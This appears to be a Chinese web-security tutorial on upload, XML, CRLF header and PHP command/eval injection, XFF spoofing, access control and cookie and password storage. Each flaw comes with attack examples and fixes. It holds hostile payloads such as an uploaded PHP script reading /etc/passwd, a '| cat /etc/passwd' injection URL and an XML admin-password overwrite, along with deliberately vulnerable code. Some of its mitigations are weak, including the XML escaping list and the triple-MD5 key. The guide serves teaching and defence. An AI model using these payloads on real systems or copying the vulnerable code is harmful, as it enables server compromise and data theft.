+<h2 id="2-2-上传漏洞"><a href="#2-2-上传漏洞" class="headerlink" title="2.2. 上传漏洞"></a>2.2. 上传漏洞</h2><h3 id="2-2-1-常见上传漏洞"><a href="#2-2-1-常见上传漏洞" class="headerlink" title="2.2.1. 常见上传漏洞"></a>2.2.1. 常见上传漏洞</h3><h4 id="2-2-1-1-上传漏洞说明"><a href="#2-2-1-1-上传漏洞说明" class="headerlink" title="2.2.1.1. 上传漏洞说明"></a>2.2.1.1. 上传漏洞说明</h4><p>Web 应用程序在处理用户上传的文件操作时，如果用户上传文件的路径、文件名、扩 展名成为用户可控数据，就会导致直接上传脚本木马到 web 服务器上，直接控制 web 服务 器。</p>
+<h4 id="2-2-1-2-常见上传漏洞实例"><a href="#2-2-1-2-常见上传漏洞实例" class="headerlink" title="2.2.1.2. 常见上传漏洞实例"></a>2.2.1.2. 常见上传漏洞实例</h4><blockquote>
+<p>代码示例</p>
+</blockquote>
+<p>以下为用户上传图像文件的脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;form action=&quot;recive.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">  文件&lt;input type=&quot;file&quot; name=&quot;imagfile&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>下面是接收文件后将其保存的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $tmpfile = $_FILES[&quot;imagfile&quot;][&quot;tmp_name&quot;];</span><br><span class="line"> $tofile = $_FILES[&quot;imagfile&quot;][&quot;name&quot;]</span><br><span class="line"> move_uploaded_file($tmpfile,&apos;imag&apos;.$tofile)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>正常情况下，用户上传图像文件，并保存到服务器。</p>
+<blockquote>
+<p>攻击实例</p>
+</blockquote>
+<p>利用上面的代码，我们假设用户上传的不是图像文件，而是以下PHP脚本文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> system(&apos;/bin/cat /etc/passwd&apos;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这段PHP脚本的作用在于通过<strong>system</strong>函数调用系统命令<strong>cat</strong>来显示<strong>etc/passwd</strong>文件的内容。访问上传的文件，页面显示了<strong>etc/passwd</strong>文件的内容。由此可以知道上传的PHP脚本在服务器上被成功执行了。攻击者就能执行当前操作系统账号权限范围内的所有操作。</p>
+<p>解决方案</p>
+<blockquote>
+<ol>
+<li><p>检查上传文件扩展名白名单，不属于白名单内，不允许上传。</p>
+</li>
+<li><p>上传文件的目录必须是http请求无法直接访问到的。如果需要访问的，必须上传到其他（和web服务器不同的）域名下，并设置该目录为不解析php、jsp、asp等脚本语言的目录。</p>
+</li>
+<li><p>上传文件要保存的文件名和目录名由系统根据时间生成，不允许用户自定义。</p>
+</li>
+</ol>
+</blockquote>
+<h2 id="2-4-XML-注入漏洞"><a href="#2-4-XML-注入漏洞" class="headerlink" title="2.4. XML 注入漏洞"></a>2.4. XML 注入漏洞</h2><p>XML injection，XML 注入漏洞。<br>XML 注入类似于 SQL 注入，XML 文件一般用作存储数据及配置，如果在修改或新增 数据时，没有对用户可控数据做转义，直接输入或输出数据，都将导致 XML 注入漏洞。</p>
+<h3 id="2-4-1-XML-注入示例"><a href="#2-4-1-XML-注入示例" class="headerlink" title="2.4.1. XML 注入示例"></a>2.4.1. XML 注入示例</h3><p>文件内有如下 XML 信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;USER =&quot;guest&quot;&gt;</span><br><span class="line">&lt;name&gt;user&lt;/name&gt;</span><br><span class="line">&lt;passwd&gt;123&lt;/passwd&gt;</span><br><span class="line">&lt;/USER&gt;</span><br><span class="line">&lt;USER role=&quot;admin&quot;&gt;</span><br><span class="line">&lt;name&gt;admin&lt;/name&gt;</span><br><span class="line">&lt;passwd&gt;1adtyr32e762t7te3&lt;/passwd&gt;</span><br><span class="line">&lt;/USER&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当 guest 权限用户修改密码时提交如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345&lt;/passwd&gt;&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt; &lt;name&gt;admin&lt;/name&gt;&lt;passwd&gt;123456&lt;/passwd&gt;&lt;/USER&gt;&lt;!---</span><br></pre></td></tr></table></figure></p>
+<p>XML 文件被修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;USER rule=&quot;guest&quot;&gt;</span><br><span class="line">    &lt;name&gt;user&lt;/name&gt; </span><br><span class="line">    &lt;passwd&gt;12345&lt;/passwd&gt; </span><br><span class="line">&lt;/USER&gt; </span><br><span class="line">&lt;USER rule=&quot;admin&quot;&gt; &lt;name&gt;admin&lt;/name&gt; &lt;passwd&gt;123456&lt;/passwd&gt; </span><br><span class="line">&lt;/USER&gt;</span><br><span class="line">&lt;!---&lt;/passwd&gt;</span><br><span class="line">&lt;/USER&gt; </span><br><span class="line">&lt;USER role=&quot;admin&quot;&gt; </span><br><span class="line">    &lt;name&gt;admin&lt;/name&gt;</span><br><span class="line">    &lt;passwd&gt;1adtyr32e762t7te3&lt;/passwd&gt; </span><br><span class="line">&lt;/USER&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如以上信息所示，管理员的密码被修改。</p>
+<p>2.4.2. XMl 注入解决方案<br>XML 注入主要预防手段是对 XML 中特殊字符做转码操作，按照以下转码规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;\n’ - New Line </span><br><span class="line">&apos;\r’ - Carriage return </span><br><span class="line">&apos;\t’ - Tab</span><br></pre></td></tr></table></figure></p>
+<h2 id="2-5-HTTP-协议头漏洞"><a href="#2-5-HTTP-协议头漏洞" class="headerlink" title="2.5. HTTP 协议头漏洞"></a>2.5. HTTP 协议头漏洞</h2><p>超文本转移协议 (HTTP-Hypertext transfer protocol) 是一种详细规定了浏览器和万 维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。HTTP 协议本身有很多自己的特性，相关定义请参考 RFC2616。一些特征字会导致 HTTP 协议源 IP 的隐藏，一些构造的畸形请求会导致 HTTP 协议的错误。当强制终止 HTTP协议请求，并在请求后添加相关信息后，会导致添加的信息返回给客户端，最终导致修改返 回数据，此类漏洞叫 HTTP 协议头注入漏洞。</p>
+<h3 id="2-5-1-HTTP-协议头-X-Forwarded-For-伪造漏洞"><a href="#2-5-1-HTTP-协议头-X-Forwarded-For-伪造漏洞" class="headerlink" title="2.5.1.    HTTP 协议头 X-Forwarded-For 伪造漏洞"></a>2.5.1.    HTTP 协议头 X-Forwarded-For 伪造漏洞</h3><h4 id="2-5-1-1-X-Forwarded-For-伪造漏洞说明"><a href="#2-5-1-1-X-Forwarded-For-伪造漏洞说明" class="headerlink" title="2.5.1.1.    X-Forwarded-For 伪造漏洞说明"></a>2.5.1.1.    X-Forwarded-For 伪造漏洞说明</h4><p>X-Forwarded-For:简称 XFF 头，它代表客户端，也就是 HTTP 请求端真实的 IP，只 有在通过了 HTTP 代理或者负载均衡服务器时才会添加该项。它不是 RFC 中定义的标准请 求头信息，在 squid 缓存代理服务器开发文档中可以找到该项的详细介绍。标准格式如 下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2</span><br></pre></td></tr></table></figure></p>
+<p>对于客户端连接过来的 IP 我们在平时的日志分析，浏览信息记录，及数据分析会大量 的用到，甚至延伸到登录规则，注册规则，当用户自行在 HTTP 传输头中添加 <strong>X-Forwarded-For</strong> 字段，错误的判断程序会取得伪造的 IP，导致基于 IP 的日志分析失效， 导致依据来源IP判断权限的程序失效，所以对此类漏洞的防御尤为重要</p>
+<h4 id="2-5-1-2-X-Forwarded-For-伪造漏洞攻击事例"><a href="#2-5-1-2-X-Forwarded-For-伪造漏洞攻击事例" class="headerlink" title="2.5.1.2.    X-Forwarded-For 伪造漏洞攻击事例"></a>2.5.1.2.    X-Forwarded-For 伪造漏洞攻击事例</h4><p>按照普通方式对于 XFF 的 IP 获取方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1 </span><br><span class="line">Host: www.vipkid.com.cn </span><br><span class="line">User-Agent: XS/CC XSX/CC/2.0 BY CC </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 </span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3 </span><br><span class="line">Accept-Encoding: gzip, deflate X-Forwarded-For: 127.0.0.1,255.255.255.255 Referer: anonymous </span><br><span class="line">Connection: keep-alive If-Modified-Since: Sun, 26 Jan 2014 09:46:07 GMT </span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></p>
+<p>记录 IP 为 127.0.0.1，造成来源 IP 伪造。</p>
+<h4 id="2-5-1-3-X-Forwarded-For-伪造漏洞解决"><a href="#2-5-1-3-X-Forwarded-For-伪造漏洞解决" class="headerlink" title="2.5.1.3.    X-Forwarded-For 伪造漏洞解决"></a>2.5.1.3.    X-Forwarded-For 伪造漏洞解决</h4><p>X-Forwarded-For 伪造根据网络结构不同分两种解决方法 </p>
+<ol>
+<li>当前端没有负载设备时，读取 X-Forwarded-For 头最后一个 ip </li>
+<li>当前端有负载均衡 设备时，倒叙读取 X-Forwarded-For 头第一个非内网 IP。</li>
+</ol>
+<h4 id="2-5-2-1-HTTP-响应头注入漏洞说明"><a href="#2-5-2-1-HTTP-响应头注入漏洞说明" class="headerlink" title="2.5.2.1. HTTP 响应头注入漏洞说明"></a>2.5.2.1. HTTP 响应头注入漏洞说明</h4><p>CRLF 说明 CRLF 就是回车(CR, ASCII 13, \r) 换行(LF, ASCII 10, \n)。 CR 和 LF 组合在一起即 CRLF。 Web 程序代码中把用户提交的参数未做过滤就直接输出到 HTTP 响应头 中，攻击者可以利用该漏洞来注入 HTTP 响应头，可以造成多种攻击、例如跨站和欺骗 用 户下载恶意可执行文件等攻击</p>
+<h4 id="2-5-2-2-HTTP-响应头注入漏洞攻击实例"><a href="#2-5-2-2-HTTP-响应头注入漏洞攻击实例" class="headerlink" title="2.5.2.2. HTTP 响应头注入漏洞攻击实例"></a>2.5.2.2. HTTP 响应头注入漏洞攻击实例</h4><p>此类漏洞最大的危害就是当插入回车换行符后，回车换行之后的数据会被回传回客户端， 导致了安全问题的产生，我们来看以下测试截图测试连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.YYYYYYYYY.com/YYYYWeb/jsp/website/agentInvoke.jsp?agentid=%0D%0AX-foo:%20bar</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-5-2-3-HTTP-响应头注入漏洞解决方案"><a href="#2-5-2-3-HTTP-响应头注入漏洞解决方案" class="headerlink" title="2.5.2.3. HTTP 响应头注入漏洞解决方案"></a>2.5.2.3. HTTP 响应头注入漏洞解决方案</h4><p>如今的许多现代应用程序服务器可以防止 HTTP 头文件感染恶意字符。 例如，当新行 传递到 header() 函数时，最新版本的 PHP 将生成一个警告并停止创建头文件。如果您的 PHP 版本能够阻止设置带有换行符的头文件，则其具备对 HTTP Response Splitting 的防 御能力。<br>代码层面常见的解决方案：</p>
+<ol>
+<li>严格检查变量是否已经初始化</li>
+<li>在设置 HTTP 响应头的代码中，过滤回车换行（%0d%0a、%0D%0A)字符</li>
+<li>禁止 header()函数中的参数外界可控 </li>
+<li>不要使用有存在 bug 版本的 apache</li>
+</ol>
+<h2 id="2-6-代码注入攻击"><a href="#2-6-代码注入攻击" class="headerlink" title="2.6. 代码注入攻击"></a>2.6. 代码注入攻击</h2><h3 id="2-6-1-代码注入攻击说明"><a href="#2-6-1-代码注入攻击说明" class="headerlink" title="2.6.1. 代码注入攻击说明"></a>2.6.1. 代码注入攻击说明</h3><p>web 应用代码中，允许接收用户输入一段代码，之后在 web 应用服务器上执行这段代 码，并返回给用户。由于用户可以自定义输入一段代码，在服务器上执行，所以恶意用户可以写一个远程控 制木马，直接获取服务器控制权限，所有服务器上的资源都会被恶意用户获取和修改，甚至 可以直接控制数据库。</p>
+<h3 id="2-6-2-危险函数"><a href="#2-6-2-危险函数" class="headerlink" title="2.6.2. 危险函数"></a>2.6.2. 危险函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">string system(string command, int &amp;return_var)</span><br><span class="line"></span><br><span class="line">    command 要执行的命令</span><br><span class="line"></span><br><span class="line">    return_var 存放执行命令的执行后的状态值</span><br><span class="line"></span><br><span class="line">string exec (string command, array &amp;output, int &amp;return_var)</span><br><span class="line"></span><br><span class="line">    command 要执行的命令</span><br><span class="line"></span><br><span class="line">    output 获得执行命令输出的每一行字符串</span><br><span class="line"></span><br><span class="line">    return_var 存放执行命令后的状态值</span><br><span class="line"></span><br><span class="line">void passthru (string command, int &amp;return_var)</span><br><span class="line"></span><br><span class="line">    command 要执行的命令</span><br><span class="line"></span><br><span class="line">    return_var 存放执行命令后的状态值</span><br><span class="line"></span><br><span class="line">    string shell_exec (string command)</span><br><span class="line"></span><br><span class="line">    command 要执行的命令</span><br></pre></td></tr></table></figure>
+<h3 id="2-6-2-漏洞实例"><a href="#2-6-2-漏洞实例" class="headerlink" title="2.6.2. 漏洞实例"></a>2.6.2. 漏洞实例</h3><h4 id="2-6-2-1-system-注入攻击"><a href="#2-6-2-1-system-注入攻击" class="headerlink" title="2.6.2.1 system()注入攻击"></a>2.6.2.1 system()注入攻击</h4><p>例1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//ex1.php </span><br><span class="line">$dir = $_GET[&quot;dir&quot;]; </span><br><span class="line">if (isset($dir)) </span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;&quot;; </span><br><span class="line">    dump(system(&quot;ls -al &quot;.$dir)); </span><br><span class="line">    echo &quot;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们提交<a href="http://www.sectop.com/ex1.php?dir=|" target="_blank" rel="noopener">http://www.sectop.com/ex1.php?dir=|</a> cat /etc/passwd</p>
+<p>提交以后，命令变成了 system(“ls -al | cat /etc/passwd”);</p>
+<h4 id="2-6-2-2-eval注入攻击"><a href="#2-6-2-2-eval注入攻击" class="headerlink" title="2.6.2.2 eval注入攻击"></a>2.6.2.2 eval注入攻击</h4><p>eval函数将输入的字符串参数当作PHP程序代码来执行</p>
+<p>函数原型:</p>
+<p>mixed eval(string code_str)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//eval注入一般发生在攻击者能控制输入的字符串的时候</span><br><span class="line"></span><br><span class="line">//ex2.php </span><br><span class="line">$var = &quot;var&quot;; </span><br><span class="line">if (isset($_GET[&quot;arg&quot;])) </span><br><span class="line">&#123; </span><br><span class="line">$arg = $_GET[&quot;arg&quot;]; </span><br><span class="line">eval(&quot;\$var = $arg;&quot;); </span><br><span class="line">echo &quot;\$var =&quot;.$var; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当我们提交<a href="http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了；" target="_blank" rel="noopener">http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了；</a></p>
+<p>动态函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">func A() </span><br><span class="line">&#123; </span><br><span class="line">dosomething(); </span><br><span class="line">&#125; </span><br><span class="line">func B() </span><br><span class="line">&#123; </span><br><span class="line">dosomething(); </span><br><span class="line">&#125; </span><br><span class="line">if (isset($_GET[&quot;func&quot;])) </span><br><span class="line">&#123; </span><br><span class="line">$myfunc = $_GET[&quot;func&quot;]; </span><br><span class="line">echo $myfunc(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>程序员原意是想动态调用A和B函数，那我们提交<a href="http://www.sectop.com/ex.php?func=phpinfo漏洞产生" target="_blank" rel="noopener">http://www.sectop.com/ex.php?func=phpinfo漏洞产生</a></p>
+<h4 id="2-6-2-3-防范方法"><a href="#2-6-2-3-防范方法" class="headerlink" title="2.6.2.3 防范方法"></a>2.6.2.3 防范方法</h4><ol>
+<li><p>尽量不要执行外部命令</p>
+</li>
+<li><p>使用自定义函数或函数库来替代外部命令的功能</p>
+</li>
+<li><p>使用escapeshellarg函数来处理命令参数</p>
+</li>
+<li><p>使用safe_mode_exec_dir指定可执行文件的路径</p>
+</li>
+</ol>
+<pre><code>esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“&quot;”，替换成“\&quot;”，分号“;”替换成“\;”
+
+用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内
+
+safe_mode = On
+
+safe_mode_exec_dir = /usr/local/php/bin/
+</code></pre><h2 id="2-7-框架安全"><a href="#2-7-框架安全" class="headerlink" title="2.7. 框架安全"></a>2.7. 框架安全</h2><p>待补充！</p>
+<h2 id="2-8-权限控制"><a href="#2-8-权限控制" class="headerlink" title="2.8. 权限控制"></a>2.8. 权限控制</h2><h3 id="2-8-1-水平权限控制"><a href="#2-8-1-水平权限控制" class="headerlink" title="2.8.1. 水平权限控制"></a>2.8.1. 水平权限控制</h3><p>Web 应用程序接收到用户请求，修改某条数据时，没有判断数据的所属人，或判断数 据所属人时，从用户提交的 request 参数（用户可控数据）中，获取了数据所属人 id，导 致恶意攻击者可以通过变换数据 ID，或变换所属人 id，修改不属于自己的数据。</p>
+<h4 id="2-8-1-1-水平权限控制示例"><a href="#2-8-1-1-水平权限控制示例" class="headerlink" title="2.8.1.1. 水平权限控制示例"></a>2.8.1.1. 水平权限控制示例</h4><p>假设 A 用户在 某商城 订单号为 12345，当访问页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/mall/?/#/personal/order/detail/12345</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<p>可以查询自己的订单，当用户改变订单号后，可访问非本人订单，导致了非常严重的信息泄漏。</p>
+<h3 id="2-8-2-垂直权限控制"><a href="#2-8-2-垂直权限控制" class="headerlink" title="2.8.2. 垂直权限控制"></a>2.8.2. 垂直权限控制</h3><p>由于 web 应用程序没有做权限控制，或仅仅在菜单上做了权限控制，导致的恶意用户 只要猜测其他管理页面的 URL，就可以访问或控制其他角色拥有的数据或页面，达到权限 提升目的。</p>
+<h4 id="2-8-2-1-垂直权限控制示例"><a href="#2-8-2-1-垂直权限控制示例" class="headerlink" title="2.8.2.1. 垂直权限控制示例"></a>2.8.2.1. 垂直权限控制示例</h4><p>如下代码，页面中只做了对菜单控制的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr&gt;</span><br><span class="line">    &lt;td&gt;</span><br><span class="line">    &lt;a href=&quot;/user.jsp&quot;&gt;管理个人信息 管理个人信息 &lt;/a&gt;</span><br><span class="line">    &lt;/td&gt;</span><br><span class="line">&lt;/tr&gt; </span><br><span class="line">&lt;%if (power.indexOf(&quot;administrators&quot;)&gt;-1)&#123;%&gt; &lt;tr&gt;&lt;td&gt;&lt;a href=&quot;/userlist.jsp&quot;&gt;管理所有用户 管理所有用户 &lt;/a&gt;&lt;/td&gt;&lt;/tr&gt; &lt;%&#125;%&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当用户直接查看源代码，即可管理所有用户。</p>
+<h3 id="2-8-3-权限控制解决方案"><a href="#2-8-3-权限控制解决方案" class="headerlink" title="2.8.3. 权限控制解决方案"></a>2.8.3. 权限控制解决方案</h3><p>权限问题出现的场景多种多样，追根揪源是对用户身份验证及验证对应权限出现纰漏导 致，所以建议以下方式验证。</p>
+<p>当用户登录后，建立一张对用户权限的临时表，表内对访问权限有着详细规定，当用户 操作与权限相关时，在表内验证用户身份后再进行处理。</p>
+<h1 id="3-WEB-数据安全"><a href="#3-WEB-数据安全" class="headerlink" title="3. WEB 数据安全"></a>3. WEB 数据安全</h1><h2 id="3-1-HTTP-传输安全"><a href="#3-1-HTTP-传输安全" class="headerlink" title="3.1.    HTTP 传输安全"></a>3.1.    HTTP 传输安全</h2><h3 id="3-1-1-HTTP-传输签名"><a href="#3-1-1-HTTP-传输签名" class="headerlink" title="3.1.1.    HTTP 传输签名"></a>3.1.1.    HTTP 传输签名</h3><h4 id="3-1-1-1-HTTP-传输签名说明"><a href="#3-1-1-1-HTTP-传输签名说明" class="headerlink" title="3.1.1.1. HTTP 传输签名说明"></a>3.1.1.1. HTTP 传输签名说明</h4><p>当 HTTP 传输与互联网中，所有中间承载网络及设备可以嗅探到传输过程，由于业务严 重性及性能考虑，在不使用 HTTPS 传输的前提下，签名便预防数据传输中被修改</p>
+<h4 id="3-1-1-2-http-传输攻击案例"><a href="#3-1-1-2-http-传输攻击案例" class="headerlink" title="3.1.1.2. http 传输攻击案例"></a>3.1.1.2. http 传输攻击案例</h4><p>用户 A 用 B 用户架设无线热点发送如下请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/order.action?user=admin&amp;orderid=123</span><br></pre></td></tr></table></figure></p>
+<p>B 用户抓包发现连接，修改 orderid，便可查询其他订单信息，导致信息泄漏</p>
+<h4 id="3-1-1-3-解决方案演示"><a href="#3-1-1-3-解决方案演示" class="headerlink" title="3.1.1.3. 解决方案演示"></a>3.1.1.3. 解决方案演示</h4><p>当用户提交连接时，添加对数据验证 KEY 防止中间人修改相关连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    function jdkey($user,$orderid) </span><br><span class="line">    &#123; </span><br><span class="line">        $key = md5(md5(md5($user.&apos;0=0+0=0&apos;.$orderid))); </span><br><span class="line">        return $key; </span><br><span class="line">    &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>按照以上代码生成 key，生成如下连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/order.action?user=admin&amp;orderid=123&amp;key= c6d41ec7a47d9b3f1345ded166e6eca5</span><br></pre></td></tr></table></figure></p>
+<p>中间人即使发现连接，也无法遍历所有订单号</p>
+<h2 id="3-2-Cookie-安全"><a href="#3-2-Cookie-安全" class="headerlink" title="3.2.    Cookie 安全"></a>3.2.    Cookie 安全</h2><h3 id="3-2-1-HTTP-协议-HttpOnly-属性"><a href="#3-2-1-HTTP-协议-HttpOnly-属性" class="headerlink" title="3.2.1.    HTTP 协议 HttpOnly 属性"></a>3.2.1.    HTTP 协议 HttpOnly 属性</h3><p>Cookie http only，是设置 COOKIE 时，可以设置的一个属性，如果 COOKIE 没有设 置这个属性，该 COOKIE 值可以被页面脚本读取。当攻击者发现一个 XSS 漏洞时，通常会写一段页面脚本，窃取用户的 COOKIE，为了 增加攻击者的门槛，防止出现因为 XSS 漏洞导致大面积用户 COOKIE 被盗，所以应该在设 置认证 COOKIE 时，增加这个属性。</p>
+<p>属性设置方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&quot;SET-COOKIE&quot;, &quot;ceshi=&quot; + request.getParameter(&quot;cookie&quot;) + &quot;; HttpOnly&quot;);</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-2-2-HTTP-协议-secure-属性"><a href="#3-2-2-HTTP-协议-secure-属性" class="headerlink" title="3.2.2.    HTTP 协议 secure 属性"></a>3.2.2.    HTTP 协议 secure 属性</h3><p>Cookie http secure，是设置 COOKIE 时，可以设置的一个属性，当 cookie 设置此属 性后，只能在 HTTPS 传输中才能传输，否则不能传输，增加可 cookie 的安全性。使用 HTTPS 通讯，所以相关 cookie 设置为 secure 属性</p>
+<p>属性设置方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&quot;SET-COOKIE&quot;, &quot;user=&quot; + request.getParameter(&quot;cookie&quot;) + &quot;; HttpOnly ; Secure &quot;);</span><br></pre></td></tr></table></figure></p>
+<h2 id="3-3-密码存储安全"><a href="#3-3-密码存储安全" class="headerlink" title="3.3. 密码存储安全"></a>3.3. 密码存储安全</h2><h3 id="3-3-1-单次-MD5-加密算法问题"><a href="#3-3-1-单次-MD5-加密算法问题" class="headerlink" title="3.3.1. 单次 MD5 加密算法问题"></a>3.3.1. 单次 MD5 加密算法问题</h3><h4 id="3-3-1-1-单次-MD5-加密算法问题说明"><a href="#3-3-1-1-单次-MD5-加密算法问题说明" class="headerlink" title="3.3.1.1. 单次 MD5 加密算法问题说明"></a>3.3.1.1. 单次 MD5 加密算法问题说明</h4><p>MD5 即 Message-Digest Algorithm 5（信息-摘要算法 5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍 已有 MD5 实现。现在黑客会利用彩虹表和穷举算法，对于 MD5 加密的密码破解率相对较高，所以不建 议采用单次 MD5 加密存储重要数据。</p>
+<h4 id="3-3-1-2-单次-MD5-加密攻击示例"><a href="#3-3-1-2-单次-MD5-加密攻击示例" class="headerlink" title="3.3.1.2. 单次 MD5 加密攻击示例"></a>3.3.1.2. 单次 MD5 加密攻击示例</h4><p>某校园网络遭入侵，获取用户名及 MD5 加密密码</p>
+<p>部分密码在网上彩虹表破解，破解概率 75%</p>
